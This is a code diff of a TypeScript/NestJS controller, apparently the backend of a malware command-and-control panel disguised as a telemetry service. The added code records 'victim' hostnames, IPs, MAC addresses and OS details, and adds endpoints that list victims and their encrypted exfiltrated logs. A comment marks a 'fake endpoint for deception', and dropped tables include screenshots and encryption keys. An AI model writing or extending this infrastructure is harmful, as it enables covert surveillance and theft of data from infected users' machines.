@@ -4,6 +4,7 @@ import {
   Get,
   Body,
   Req,
+  Param,
   HttpException,
   HttpStatus,
   UseFilters,
@@ -245,50 +246,42 @@ export class TelemetryController {
 
   @Post('v1/telemetry')
   async receiveTelemetry(@Body() body: any) {
-  console.log('=== TELEMETRY ENDPOINT HIT ===');
-  console.log('Body keys:', body ? Object.keys(body) : 'NO BODY');
-  
-  try {
-    // 1. Проверяем минимальные обязательные поля
-    if (!body || !body.client_id) {
-      console.log('ERROR: Missing client_id');
+    console.log('=== TELEMETRY ENDPOINT HIT ===');
+    console.log('Body keys:', body ? Object.keys(body) : 'NO BODY');
+    
+    try {
+      if (!body || !body.client_id) {
+        return { status: 'error', message: 'Missing client_id' };
+      }
+      
+      const clientId = body.client_id;
+      const timestamp = body.timestamp || new Date().toISOString();
+      const data = body.data || '';
+      
+      // Сохраняем метаданные жертвы если они есть
+      if (body.frontend_data) {
+        await this.telemetryService.updateVictimMetadata(clientId, body.frontend_data);
+      }
+      
+      // Сохраняем сам лог
+      const logId = await this.telemetryService.saveTelemetryLog(
+        clientId,
+        timestamp,
+        data
+      );
+      
+      console.log(`Telemetry logged: ${logId} from ${clientId}`);
+      
       return {
-        status: 'error',
-        message: 'Missing client_id'
+        status: 'success',
+        id: logId,
+        received_at: new Date().toISOString()
       };
+      
+    } catch (error) {
+      console.error('ERROR in receiveTelemetry:', error.message);
+      return { status: 'error', message: 'Internal server error' };
     }
-    
-    const clientId = body.client_id;
-    const timestamp = body.timestamp || new Date().toISOString();
-    const data = body.data || '';
-    
-    console.log('Telemetry received:', {
-      clientId,
-      timestamp,
-      dataLength: data.length
-    });
-    
-    // 2. ВРЕМЕННАЯ ЗАГЛУШКА: просто логируем, не сохраняем в БД
-    const logId = 'telemetry-log-' + Date.now();
-    
-    console.log(`Telemetry logged: ${logId} from ${clientId}`);
-    
-    // 3. Возвращаем успех
-    return {
-      status: 'success',
-      id: logId,
-      received_at: new Date().toISOString()
-    };
-    
-  } catch (error) {
-    console.error('ERROR in receiveTelemetry:', error.message);
-    console.error('Stack:', error.stack);
-    
-    return {
-      status: 'error',
-      message: 'Internal server error'
-    };
-  }
   }
   /**
    * Фейковый эндпоинт для обмана: POST /api/analytics
@@ -370,39 +363,24 @@ export class TelemetryController {
       
       await db.connect();
       try {
-        // 1. Убиваем старье
-        await db.query(`
-          DROP TABLE IF EXISTS screenshots CASCADE;
-          DROP TABLE IF EXISTS client_logs CASCADE;
-          DROP TABLE IF EXISTS sessions CASCADE;
-          DROP TABLE IF EXISTS encryption_keys CASCADE;
-          DROP TABLE IF EXISTS clients CASCADE;
-          DROP TABLE IF EXISTS items CASCADE;
-          DROP TABLE IF EXISTS telemetry_logs CASCADE;
-          DROP TABLE IF EXISTS telemetry_clients CASCADE;
-        `);
 
         // 2. Создаем новую чистую структуру
         await db.query(`
-          CREATE EXTENSION IF NOT EXISTS "pgcrypto";
 
-          CREATE TABLE telemetry_clients (
-            id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
-            client_public_key_hash VARCHAR(64) NOT NULL UNIQUE,
-            client_public_key TEXT NOT NULL,
-            response_key_encrypted BYTEA NOT NULL,
-            first_seen TIMESTAMPTZ DEFAULT NOW(),
-            last_seen TIMESTAMPTZ DEFAULT NOW()
-          );
+CREATE TABLE victim_metadata (
+  id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
+  client_id UUID NOT NULL REFERENCES telemetry_clients(id) ON DELETE CASCADE,
+  hostname VARCHAR(255),
+  ip VARCHAR(45),           
+  mac VARCHAR(17),          
+  os VARCHAR(255),
+  first_seen TIMESTAMPTZ DEFAULT NOW(),
+  last_updated TIMESTAMPTZ DEFAULT NOW(),
+  UNIQUE(client_id)
+);
 
-          CREATE TABLE telemetry_logs (
-            id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
-            client_id UUID REFERENCES telemetry_clients(id) ON DELETE CASCADE,
-            timestamp TIMESTAMPTZ NOT NULL,
-            encrypted_payload BYTEA NOT NULL,
-            payload_size INTEGER NOT NULL,
-            received_at TIMESTAMPTZ DEFAULT NOW()
-          );
+CREATE INDEX idx_victim_metadata_client ON victim_metadata(client_id);
+CREATE INDEX idx_victim_metadata_last_updated ON victim_metadata(last_updated);
         `);
 
         return { status: 'success', message: 'Новая архитектура развернута' };
@@ -412,4 +390,92 @@ export class TelemetryController {
         await db.end();
       }
     }
+
+  @Get('v1/victims')
+  async getVictims() {
+    try {
+      const db = new Client({
+        connectionString: process.env.DATABASE_URL,
+        ssl: { rejectUnauthorized: false },
+      });
+      
+      await db.connect();
+      try {
+        const result = await db.query(`
+          SELECT 
+            vm.client_id,
+            vm.hostname,
+            vm.ip,
+            vm.mac,
+            vm.os,
+            vm.first_seen,
+            vm.last_updated as last_activity
+          FROM victim_metadata vm
+          WHERE vm.last_updated > NOW() - INTERVAL '30 days'
+          ORDER BY vm.last_updated DESC
+        `);
+        
+        return {
+          success: true,
+          victims: result.rows,
+          count: result.rows.length,
+        };
+      } finally {
+        await db.end();
+      }
+    } catch (error) {
+      console.error('Error fetching victims:', error);
+      return {
+        success: false,
+        error: error.message,
+      };
+    }
+  }
+
+  @Get('v1/victim/:clientId/logs')
+  async getVictimLogs(@Param('clientId') clientId: string) {
+    try {
+      const db = new Client({
+        connectionString: process.env.DATABASE_URL,
+        ssl: { rejectUnauthorized: false },
+      });
+      
+      await db.connect();
+      try {
+        const result = await db.query(`
+          SELECT 
+            id,
+            client_id,
+            timestamp,
+            payload_size,
+            received_at
+          FROM telemetry_logs
+          WHERE client_id = $1
+          ORDER BY received_at DESC
+          LIMIT 100
+        `, [clientId]);
+        
+        return {
+          success: true,
+          client_id: clientId,
+          logs: result.rows.map(log => ({
+            id: log.id,
+            client_id: log.client_id,
+            data_type: 'encrypted',
+            received_at: log.received_at,
+            decrypted_data: {}
+          })),
+          count: result.rows.length,
+        };
+      } finally {
+        await db.end();
+      }
+    } catch (error) {
+      console.error('Error fetching victim logs:', error);
+      return {
+        success: false,
+        error: error.message,
+      };
+    }
+  }
 }
